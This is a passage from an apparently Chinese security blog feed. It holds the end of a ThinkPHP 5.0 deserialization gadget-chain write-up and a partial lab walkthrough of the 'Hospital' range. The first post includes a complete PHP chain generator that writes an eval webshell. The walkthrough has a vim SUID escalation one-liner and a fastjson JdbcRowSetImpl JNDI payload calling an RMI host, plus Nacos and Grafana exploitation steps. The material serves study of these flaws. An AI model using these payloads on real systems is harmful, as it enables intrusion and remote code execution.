class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//__destruct</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Windows</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$pivot</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files[] = <span class="variable">$pivot</span>; <span class="comment">//传入Pivot类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//__toString Model子类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Pivot</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">parent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>, <span class="variable">$hasone</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="variable">$output</span>; <span class="comment">//$this-&gt;parent等于Output类</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;getError&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="variable">$hasone</span>;   <span class="comment">//$modelRelation=$this-&gt;error</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//getModel</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Query</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = <span class="variable">$output</span>; <span class="comment">//get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Output</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">handle</span> = <span class="title class_">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$memcached</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$memcached</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Relation</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">query</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="variable">$query</span>; <span class="comment">//调用Query类的getModel</span></span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="literal">false</span>; <span class="comment">//满足条件!$modelRelation-&gt;isSelfRelation()</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;admin&#x27;</span>];  <span class="comment">//控制__call的参数$attr</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span> = <span class="title class_">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="variable">$file</span>; <span class="comment">//$this-&gt;handler等于File类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span> = [</span><br><span class="line">            &#x27;<span class="title class_">path</span>&#x27; =&gt; &#x27;<span class="title class_">php</span>://<span class="title class_">filter</span>/<span class="title class_">convert</span>.<span class="title class_">iconv</span>.<span class="title class_">utf</span>-8.<span class="title class_">utf</span>-7|<span class="title class_">convert</span>.<span class="title class_">base64</span>-<span class="title class_">decode</span>/<span class="title class_">resource</span>=<span class="title class_">aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g</span>/../<span class="title class_">a</span>.<span class="title class_">php</span>&#x27;,</span><br><span class="line">            &#x27;<span class="title class_">cache_subdir</span>&#x27; =&gt; <span class="title class_">false</span>,</span><br><span class="line">            &#x27;<span class="title class_">prefix</span>&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;<span class="title class_">data_compress</span>&#x27; =&gt; <span class="title class_">false</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">file</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>();</span><br><span class="line">    <span class="variable">$memcached</span> = <span class="keyword">new</span> think\session\driver\<span class="title function_ invoke__">Memcached</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$output</span> = <span class="keyword">new</span> think\console\<span class="title function_ invoke__">Output</span>(<span class="variable">$memcached</span>);</span><br><span class="line">    <span class="variable">$query</span> = <span class="keyword">new</span> think\db\<span class="title function_ invoke__">Query</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="variable">$hasone</span> = <span class="keyword">new</span> think\model\relation\<span class="title function_ invoke__">HasOne</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="variable">$pivot</span> = <span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>(<span class="variable">$output</span>, <span class="variable">$hasone</span>);</span><br><span class="line">    <span class="variable">$windows</span> = <span class="keyword">new</span> think\process\pipes\<span class="title function_ invoke__">Windows</span>(<span class="variable">$pivot</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$windows</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成base64编码后直接打</p><p><img src="../images/image-20240118140400694.png" alt="image-20240118140400694"></p><p>执行后会在当前目录下生成两个文件</p><p><img src="../images/image-20240118140426841.png" alt="image-20240118140426841"></p><p><img src="../images/image-20240118140454334.png" alt="image-20240118140454334"></p><p>然后访问就行了</p><p><img src="../images/image-20240118140515870.png" alt="image-20240118140515870"></p><p>成功RCE</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="../images/image-20240118140640755.png" alt="image-20240118140640755"></p><p>在此处下个断点  前面的话和刚刚5.1.37那条链子还是一样的  主要是后面不太相同</p><p><img src="../images/image-20240118141135360.png" alt="image-20240118141135360"></p><p>然后还是进入到这个windows这个类中  还是得跟进到removeFiles方法中</p><p><img src="../images/image-20240118141656177.png" alt="image-20240118141656177"></p><p>跟进到这个removeFiles中  然后原因也和5.1的版本是一样的  filename是pivot对象  所以直接会调用到toString方法  但是这里没有Conversion这个类  所以会直接调用到Model这个类中的toString方法</p><p><img src="../images/image-20240118141939561.png" alt="image-20240118141939561"></p><p>进入toJson方法中  </p><p><img src="../images/image-20240118142026967.png" alt="image-20240118142026967"></p><p>然后接着进入到toArray这个方法中</p><p><img src="../images/image-20240118142050860.png" alt="image-20240118142050860"></p><p>在我们进入到这个toArray以后  接下来的操作就和5.1版本的就不同了  </p><p><img src="../images/image-20240118142628151.png" alt="image-20240118142628151"></p><p>这是等会我们需要用到的4个重要的函数方法  我们先跟进这个parseName方法  来看这个$relation是怎么获取到的</p><p><img src="../images/image-20240118142924503.png" alt="image-20240118142924503"></p><p><img src="../images/image-20240118142907106.png" alt="image-20240118142907106"></p><p>进入到parseName后  我们获取到其relation的值为getError函数  并且Model类中存在这个函数  那么我们就会进入到这个Method_exists方法中</p><p><img src="../images/image-20240118143146658.png" alt="image-20240118143146658"></p><p>这里的话就会调用这个getError方法 来给modelRelation赋值  我们跟进这个relation方法中</p><p><img src="../images/image-20240118143308014.png" alt="image-20240118143308014"></p><p>这里的话是返回HashOne这个类  (因为可控 我们设置成了HashOne)</p><p><img src="../images/image-20240118143511444.png" alt="image-20240118143511444"></p><p>这里Model是Pivot的父类</p><p><img src="../images/image-20240118143544250.png" alt="image-20240118143544250"></p><p>然后我们就可以在pivot中队Model的error参数赋值  这就是error可控的原因 </p><p><img src="../images/image-20240118143813631.png" alt="image-20240118143813631"></p><p>进入到getRalationData中  这个函数的返回结果是对$value的赋值  然而通过代码 我们发现其要进入到给$value赋值需要三个条件</p><ul><li>$this-&gt;parent</li><li>!$modelRelation-&gt;isSelfRelation()</li><li>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent))</li></ul><p><strong>条件一</strong></p><p>首先我们要知道在toString这一步我们需要做什么，5.1版本是触发了<strong>call方法，那么这里我们也应该寻找能否找到合适的call方法，最后结果就是<code>think\console\Output</code>类，那么我们应该让这个方法返回一个Output对象，这样在出去之后执行<code>$value-&gt;getAttr($attr)</code>才会触发`</strong>call<code>魔术方法，而该方法中value的值就是</code>$this-&gt;parent`，所以第一个条件parent需要为Output对象</p><p><strong>条件二</strong></p><p>对于第二个条件，<code>$modelRelation</code>我们已经完成了赋值，为<code>HasOne</code>对象，我们观察一下</p><p><img src="../images/image-20240118144542810.png" alt="image-20240118144542810"></p><p>先看看HasOne对象   继承于OneToOne对象  然后跟进OneToOne对象</p><p><img src="../images/image-20240118144635007.png" alt="image-20240118144635007"></p><p>然后发现这个OneToOne继承于Relation对象</p><p><img src="../images/image-20240118144711774.png" alt="image-20240118144711774"></p><p>然后我们发现这个isSelfRelation函数就是在Relation这个类中  那么我们就可以直接在HasOne这个类中定义这个selfRelation的值了  只需让他为false即可</p><p><strong>条件三</strong></p><p>最后一个条件需要让<code>Hasone::getModel</code>返回一个Output对象($this-&gt;parent)，观察该方法：</p><p><img src="../images/image-20240118144956361.png" alt="image-20240118144956361"></p><p>直接调用其父类中的getModel方法  并且这个$this-&gt;query可控  所以我们接着去全局寻找谁的getModel方法能够返回Output对象</p><p><img src="../images/image-20240118145143837.png" alt="image-20240118145143837"></p><p><code>/thinkphp/library/think/db/Query.php</code>中的getModel方法我们可控：  所以条件三也满足</p><p>在这里只需要让<code>this-&gt;query==thinkphp/library/thinl/db/Query.php</code>即可，然后让他的model属性为<code>Output</code>对象</p><p><img src="../images/image-20240118145258277.png" alt="image-20240118145258277"></p><p>满足条件  成功给$value赋值为Output对象  然后我们进入到getBindAttr方法中</p><p><img src="../images/image-20240118145517139.png" alt="image-20240118145517139"></p><p>直接进入到HasOne的父类OneToOne的getBindAttr中</p><p>返回HasOne对象的bindAttr属性，这里我们设置为一个数组<code>[&quot;a&quot;=&gt;&quot;admin&quot;]</code>，这里的admin和结果中的文件名有关</p><p><img src="../images/image-20240118145733563.png" alt="image-20240118145733563"></p><p>这里的话对我们输入的$bindAttr进行遍历  然后因为$value是我们之前设置的Output类  然后这个类中没有getAttr方法  于是就会进入到这个类的__call方法中</p><p><img src="../images/image-20240118150350008.png" alt="image-20240118150350008"></p><p>进入到这个call方法中的时候  有点和5.1类似的地方了</p><p><img src="../images/image-20240118150521050.png" alt="image-20240118150521050"></p><p>用array_shift方法将method和args结合在了一起，随后调用<code>call_user_func_array</code>方法调用了自己的block方法，跟进该方法：</p><p><img src="../images/image-20240118150647367.png" alt="image-20240118150647367"></p><p>然后接着跟进这个writeln方法中  message是admin</p><p><img src="../images/image-20240118150729940.png" alt="image-20240118150729940"></p><p>其他参数不变  message还是为admin   然后我们接着跟进这个write方法中</p><p><img src="../images/image-20240118150821402.png" alt="image-20240118150821402"></p><p>然后我们发现了这个handle可控  我们全局找write方法   最终在<code>Memcached</code>类找到合适的write方法，因此让Output的handle属性为<code>Memcached</code>类：</p><p><img src="../images/image-20240118150928189.png" alt="image-20240118150928189"></p><p>调用到了这个Memcached类中的write方法  还调用了set方法，再找谁调用了set，最终在<code>think/cache/driver/File</code>类找到了，因此让Memcache对象的handler属性变为File对象，最后触发它的set方法，参数为上面带下来的：</p><p><img src="../images/image-20240118151029284.png" alt="image-20240118151029284"></p><p><img src="../images/image-20240118151110533.png" alt="image-20240118151110533"></p><p>然后我们发现这个类中有个file_put_contents函数   但是有个前提是得绕过这个死亡exit  不然会终止进程  导致内容写不进去</p><p><a href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">死亡die绕过</a></p><p><img src="../images/image-20240118151527670.png" alt="image-20240118151527670"></p><p>这里的话我们跟进这个getCacheKey函数  因为我们的filename是通过这个函数来获取的</p><p><img src="../images/image-20240118151619990.png" alt="image-20240118151619990"></p><p>这个name的话是我们在前面的传入的值 <code>&lt;getAttr&gt;admini&lt;getAttr&gt;</code>  的md5值</p><p>其中<code>this-&gt;options[&#39;path&#39;]</code>是我们可控的，这里让他为<code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php</code>可以绕过死亡函数</p><p>但是我们要注意，即使可控文件名，但是文件内容<code>$data</code>，也就是<code>$value</code>在这一次进入set方法不可控，为默认的<code>true</code>，因此即使能创建文件也不能写马<br>继续往下分析会调用</p><p><img src="../images/image-20240118152131600.png" alt="image-20240118152131600"></p><p>这里的返回名字是 <code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php63ac11a7699c5c57d85009296440d77a.php</code>   </p><p>但是这里的data我们不可控     所以没有办法  我们进入到下面的if后  我们发现还有个setTagItem函数  然后我们跟进</p><p><img src="../images/image-20240118152244714.png" alt="image-20240118152244714"></p><p><img src="../images/image-20240118153005523.png" alt="image-20240118153005523"></p><p>然后这个会再次进入到这个set方法中  并且这个key和value值1可控  那么就会再次执行fileputcontent函数  就会再次写入值</p><p>第二个文件名就是<code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php+md5(tag_c4ca4238a0b923820dcc509a6f75849b)+.php</code></p><p>第二个可控是因为这个filename和data的值是一样的  传入的时候</p><p><a href="https://xz.aliyun.com/t/7457?time__1311=n4%2BxnD0G0%3Dit0QDkDcnDlhjmP8twK%3DTYr%3Dd4D&amp;alichlgref=https%3A%2F%2Flink.csdn.net%2F%3Ftarget%3Dhttps%253A%252F%252Fxz.aliyun.com%252Ft%252F7457%2523toc-3">https://xz.aliyun.com/t/7457?time__1311=n4%2BxnD0G0%3Dit0QDkDcnDlhjmP8twK%3DTYr%3Dd4D&amp;alichlgref=https%3A%2F%2Flink.csdn.net%2F%3Ftarget%3Dhttps%253A%252F%252Fxz.aliyun.com%252Ft%252F7457%2523toc-3</a></p><p>这篇文章解释了为什么能能在windows下使用phpfilter生成文件的原因</p><p><img src="../images/image-20240118153216548.png" alt="image-20240118153216548"></p><p><img src="../images/image-20240118153252600.png" alt="image-20240118153252600"></p><p>这个就是专门生成写入的值   然后这里就完成FW了</p><p>这里贴一张链子图</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677554303467-3637e100-8061-4dc9-afb8-b7197601b72a.png#averageHue=%230f3b3e&amp;clientId=ucdcb2c75-f9bd-4&amp;from=paste&amp;height=2437&amp;id=u0dd4d63a&amp;name=20221011115008-ccb4a1ce-4917-1.png&amp;originHeight=3046&amp;originWidth=1799&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=746691&amp;status=done&amp;style=none&amp;taskId=ud496bfd7-66ed-4853-8185-4d591fc56ed&amp;title=&amp;width=1439.2" alt="20221011115008-ccb4a1ce-4917-1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;实习的时候审代码发现自己对这种反序列化链的寻找能力不太行  于是去找个thinkphp的链子来学习学习&lt;/p&gt;
&lt;p&gt;参考文章  &lt;a href=&quot;https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E</summary>
      
    
    
    
    
    <category term="php" scheme="https://ke1nys.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Hospital</title>
    <link href="https://ke1nys.github.io/posts/d66aab01.html"/>
    <id>https://ke1nys.github.io/posts/d66aab01.html</id>
    <published>2024-01-14T10:01:42.000Z</published>
    <updated>2024-01-20T15:32:19.408Z</updated>
    
    <content type="html"><![CDATA[<p>参考   <a href="https://www.cnblogs.com/thebeastofwar/p/17939471">https://www.cnblogs.com/thebeastofwar/p/17939471</a></p><p>先用fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 39.99.253.63    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">39.99.253.63:22 open</span><br><span class="line">39.99.253.63:8080 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://39.99.253.63:8080  code:302 len:0      title:None 跳转url: http://39.99.253.63:8080/login;jsessionid=3E0908F84358B2D6BB6961A2EDEA7698</span><br><span class="line">[*] WebTitle: http://39.99.253.63:8080/login;jsessionid=3E0908F84358B2D6BB6961A2EDEA7698 code:200 len:2005   title:医疗管理后台</span><br><span class="line">[+] http://39.99.253.63:8080 poc-yaml-spring-actuator-heapdump-file</span><br></pre></td></tr></table></figure><p>直接给出poc了</p><p>就是一个spring的heapdump泄露   然后就去找工具来分析泄露的信息</p><p><img src="../images/image-20240114180342083.png" alt="image-20240114180342083"></p><p>这里不建议使用这个工具  因为这个工具给出的shirokey是错的  (tmd)</p><p>然后选个别的工具</p><p><a href="https://github.com/whwlsfb/JDumpSpider/release">https://github.com/whwlsfb/JDumpSpider/release</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump &gt; 1.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240114180522672.png" alt="image-20240114180522672"></p><p>这个就是对的  然后就去找那种gui工具直接打就行  <strong>(这样方便一点)</strong></p><p>我这里用的是这个工具</p><p><img src="../images/image-20240114180629106.png" alt="image-20240114180629106"></p><p><img src="../images/image-20240114180648754.png" alt="image-20240114180648754"></p><p>填入地址和密钥  然后直接打就行  然后写个内存马  用冰蝎来连接  </p><p><img src="../images/image-20240114180734537.png" alt="image-20240114180734537"></p><p><img src="../images/image-20240114180748494.png" alt="image-20240114180748494"></p><p>然后弹个shell到自己的vps上 </p><p>进行suid提权</p><p>这里发现是vim 然后去提权网站上看找到poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -c &#x27;:python3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>然后拿flag并且写rsa后门就行了</p><p><img src="../images/image-20240114180958290.png" alt="image-20240114180958290"></p><p>然后开始扫内网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">./fscan* -h 172.30.12.0/24 -p 1-65535</span><br><span class="line"></span><br><span class="line">172.30.12.5    getshell主机</span><br><span class="line"></span><br><span class="line">172.30.12.6  3389 8848</span><br><span class="line"></span><br><span class="line">172.30.12.236 8009 8080 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] WebTitle: http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found</span><br><span class="line">[+] http://172.30.12.6:8848 poc-yaml-alibaba-nacos </span><br><span class="line">[+] http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass</span><br><span class="line"></span><br><span class="line">[*] WebTitle: http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台</span><br></pre></td></tr></table></figure><p>发现了个nacos  还是存在poc的  但是这个没啥用  rce不了  于是去Google了一下</p><p><img src="../images/image-20240114181101593.png" alt="image-20240114181101593"></p><p>找到了这个  snakeyaml反序列化</p><p>然后去找工具来打就行了</p><blockquote><p>nacos实现rce有两种方法,一种是SnakeYaml反序列化,一种是Hessian 反序列化漏洞<br>但是Hessian 反序列化漏洞2.0.0 &lt;= Nacos &lt; 2.2.3 任意模式启动才受到影响,这里是1.4.1没受到影响<br>所以用SnakeYaml反序列化<br><a href="https://github.com/artsploit/yaml-payload/">https://github.com/artsploit/yaml-payload/</a></p></blockquote><p><img src="../images/image-20240114181244340.png" alt="image-20240114181244340"></p><p>然后重新编译生成jar包就行  (记得用jdk8)</p><p><img src="../images/image-20240114181315443.png" alt="image-20240114181315443"></p><p>执行后RDP上去  就可以拿到第二个flag了</p><p><img src="../images/image-20240114181412591.png" alt="image-20240114181412591"></p><p>这个东西不是域的  所以接着看另一个ip</p><p>因为我看到题目提示了个fastjson  然后我就猜测是打fastjson的</p><p><img src="../images/image-20240114181500643.png" alt="image-20240114181500643"></p><p>然后再看另一个ip的两个端口</p><blockquote><p>172.30.12.236 8009 8080 </p></blockquote><p>搜了一下发现是tomcat的任意文件读取  (可以读取fastjson的依赖   1.2.45)</p><p>然后直接打就行了</p><p><img src="../images/image-20240114181704634.png" alt="image-20240114181704634"></p><p><img src="../images/image-20240114181716453.png" alt="image-20240114181716453"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123; &quot;name&quot;: &#123;   &quot;@type&quot;: &quot;java.lang.Class&quot;,&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;,&quot;x&quot;: &#123;   &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,   &quot;dataSourceName&quot;: &quot;rmi://172.30.12.5:1099/psrrch&quot;,   &quot;autoCommit&quot;: true &#125;&#125;</span><br></pre></td></tr></table></figure><p>然后shell弹上去之后</p><p>发现是存在两个网卡</p><p>fscan扫一下  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.30.54.179   is alive</span><br><span class="line">(icmp) Target 172.30.54.12    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 2</span><br><span class="line">172.30.54.12:22 open</span><br><span class="line">172.30.54.179:22 open</span><br><span class="line">172.30.54.12:3000 open</span><br><span class="line">172.30.54.12:5432 open</span><br><span class="line">172.30.54.179:8009 open</span><br><span class="line">172.30.54.179:8080 open</span><br><span class="line">172.30.54.179:44401 open</span><br><span class="line">[*] alive ports len is: 7</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login</span><br><span class="line">[*] WebTitle: http://172.30.54.12:3000/login code:200 len:27909  title:Grafana</span><br><span class="line">[*] WebTitle: http://172.30.54.179:8080 code:200 len:3964   title:医院后台管理平台</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240114181939760.png" alt="image-20240114181939760"></p><p>弱口令 admin/admin登录上去后  这个存在一个任意文件读取的漏洞  (版本8.3.0)</p><p><img src="../images/image-20240114182044614.png" alt="image-20240114182044614"></p><p>然后去github上找个自动化工具来打一下</p><p><a 